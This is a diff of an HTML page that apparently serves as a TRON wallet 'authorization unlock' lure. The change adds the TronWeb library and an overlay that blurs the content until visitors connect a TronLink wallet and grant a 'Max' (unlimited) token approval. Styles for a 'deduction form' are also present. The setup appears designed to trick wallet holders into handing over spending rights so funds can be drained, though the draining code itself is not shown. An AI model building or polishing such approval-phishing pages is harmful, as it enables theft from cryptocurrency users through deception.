@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON 授權解鎖服務 (最終修復版)</title>
+    <title>TRON 授權解鎖服務 (TronLink 專用版)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <link rel="stylesheet" href="./src/style.css"> 
     
@@ -27,6 +27,7 @@
         #deductionForm input, #deductionForm select { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin-bottom: 10px; }
         #deductionForm button { background-color: #28a745; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; width: 100%; }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.full.js"></script>
 </head>
 <body>
 <i id="connectButton" class="fas fa-wallet" title="連繫錢包"></i>
@@ -35,7 +36,8 @@
 
 <div id="blurOverlay">
     <div id="overlayMessage">
-        正在初始化...
+        請連繫您的錢包並完成**Max 授權**以解鎖內容 🔒
+        <p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(請使用 TronLink 錢包或 Tron DApp 瀏覽器訪問)</p>
     </div>
 </div>
 
